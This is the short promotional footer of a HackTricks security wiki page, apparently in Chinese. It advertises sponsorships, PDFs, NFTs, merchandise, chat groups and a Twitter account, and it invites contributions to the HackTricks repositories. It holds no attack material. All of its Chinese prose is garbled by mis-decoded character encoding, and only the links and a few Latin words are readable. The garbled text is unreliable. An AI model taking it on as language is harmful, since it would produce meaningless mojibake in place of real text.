- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
